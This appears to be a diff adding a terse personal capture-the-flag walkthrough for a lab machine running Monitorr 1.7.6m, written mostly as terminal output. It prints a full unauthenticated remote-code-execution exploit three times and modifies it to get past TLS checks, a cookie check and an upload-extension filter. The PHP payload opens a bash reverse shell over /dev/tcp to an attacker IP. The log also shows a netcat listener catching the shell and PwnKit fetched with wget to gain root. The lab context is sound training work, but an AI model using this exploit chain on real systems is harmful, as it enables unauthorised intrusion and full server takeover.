@@ -1,0 +1,325 @@
+
+
+
+nmap and certificate shows many subdomains
+
+on monitorr we see version 1.7.6m
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit monitorr                                                          
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Monitorr 1.7.6m - Authorization Bypass                                             | php/webapps/48981.py
+Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)                          | php/webapps/48980.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat 48980.py 
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+
+import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
+else:
+    url = sys.argv[1] + "/assets/php/upload.php"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}
+
+    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
+
+    requests.post(url, headers=headers, data=data)
+
+    print ("A shell script should be uploaded. Now we try to execute it")
+    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+    requests.get(url, headers=headers)                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python 48980.py                                                                     
+specify params in format: python 48980.py target_url lhost lport
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python 48980.py https://monitorr.robyns-petshop.thm/ 192.168.141.97 53
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 464, in _make_request
+    self._validate_conn(conn)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 1093, in _validate_conn
+    conn.connect()
+    ~~~~~~~~~~~~^^
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 790, in connect
+    sock_and_verified = _ssl_wrap_socket_and_match_hostname(
+        sock=sock,
+    ...<14 lines>...
+        assert_fingerprint=self.assert_fingerprint,
+    )
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 969, in _ssl_wrap_socket_and_match_hostname
+    ssl_sock = ssl_wrap_socket(
+        sock=sock,
+    ...<8 lines>...
+        tls_in_tls=tls_in_tls,
+    )
+  File "/usr/lib/python3/dist-packages/urllib3/util/ssl_.py", line 480, in ssl_wrap_socket
+    ssl_sock = _ssl_wrap_socket_impl(sock, context, tls_in_tls, server_hostname)
+  File "/usr/lib/python3/dist-packages/urllib3/util/ssl_.py", line 524, in _ssl_wrap_socket_impl
+    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)
+           ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/ssl.py", line 455, in wrap_socket
+    return self.sslsocket_class._create(
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
+        sock=sock,
+        ^^^^^^^^^^
+    ...<5 lines>...
+        session=session
+        ^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/usr/lib/python3.13/ssl.py", line 1076, in _create
+    self.do_handshake()
+    ~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/ssl.py", line 1372, in do_handshake
+    self._sslobj.do_handshake()
+    ~~~~~~~~~~~~~~~~~~~~~~~~~^^
+ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1033)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 787, in urlopen
+    response = self._make_request(
+        conn,
+    ...<10 lines>...
+        **response_kw,
+    )
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 488, in _make_request
+    raise new_e
+urllib3.exceptions.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1033)
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 667, in send
+    resp = conn.urlopen(
+        method=request.method,
+    ...<9 lines>...
+        chunked=chunked,
+    )
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 841, in urlopen
+    retries = retries.increment(
+        method, url, error=new_e, _pool=self, _stacktrace=sys.exc_info()[2]
+    )
+  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 519, in increment
+    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: /assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1033)')))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/kali/48980.py", line 24, in <module>
+    requests.post(url, headers=headers, data=data)
+    ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 115, in post
+    return request("post", url, data=data, json=json, **kwargs)
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+           ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 698, in send
+    raise SSLError(e, request=request)
+requests.exceptions.SSLError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: /assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1033)')))
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+we change to include verify=False
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat 48980.py 
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+
+import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
+else:
+    url = sys.argv[1] + "/assets/php/upload.php"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}
+
+    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
+
+    requests.post(url, headers=headers, data=data, verify=False)
+
+    print ("A shell script should be uploaded. Now we try to execute it")
+    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+    requests.get(url, headers=headers, verify=False)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python 48980.py https://monitorr.robyns-petshop.thm/ 192.168.141.97 53
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'monitorr.robyns-petshop.thm'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+A shell script should be uploaded. Now we try to execute it
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'monitorr.robyns-petshop.thm'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+this fails...
+we see that a cookie is set as isHuman=1
+
+we include this in the exploit.
+
+it still doesnt work. we need to change the extensions
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat 48980.py
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+
+import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
+else:
+    url = sys.argv[1] + "/assets/php/upload.php"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}
+
+    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.gif.pHp\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
+
+    requests.post(url, headers=headers, data=data, verify=False, cookies={"isHuman": "1"})
+
+    print ("A shell script should be uploaded. Now we try to execute it")
+    url = sys.argv[1] + "/assets/data/usrimg/she_ll.gif.pHp"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+    requests.get(url, headers=headers, verify=False, cookies={"isHuman": "1"})
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+find the image in 
+https://monitorr.robyns-petshop.thm/assets/data/usrimg/
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53                           
+listening on [any] 53 ...
+connect to [192.168.141.97] from (UNKNOWN) [10.65.122.112] 40864
+bash: cannot set terminal process group (899): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ 
+
+
+
+www-data@petshop:/var/www$ find / -perm -u=s -type f 2>/dev/null
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+/bin/fusermount
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newuidmap
+www-data@petshop:/var/www$ 
+
+
+
+
+
+multiple ways to priv esc
+
+
+
+
+www-data@petshop:/var/www$ wget http://192.168.141.97/PwnKit.sh -O /tmp/pwnkit.sh
+--2025-11-27 08:06:56--  http://192.168.141.97/PwnKit.sh
+Connecting to 192.168.141.97:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 150 [text/x-sh]
+Saving to: '/tmp/pwnkit.sh'
+
+/tmp/pwnkit.sh                100%[==============================================>]     150  --.-KB/s    in 0s      
+
+2025-11-27 08:06:56 (36.4 MB/s) - '/tmp/pwnkit.sh' saved [150/150]
+
+www-data@petshop:/var/www$ cd /tmp
+www-data@petshop:/tmp$ chmod +x pwnkit.sh
+www-data@petshop:/tmp$ ./pwnkit.sh
+root@petshop:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@petshop:/tmp# 
+
+
+
+another waty is abused dirty_sock with snap 2.32.5
+
+
+
+
+
+
+
+
+
+
+
+
+
+
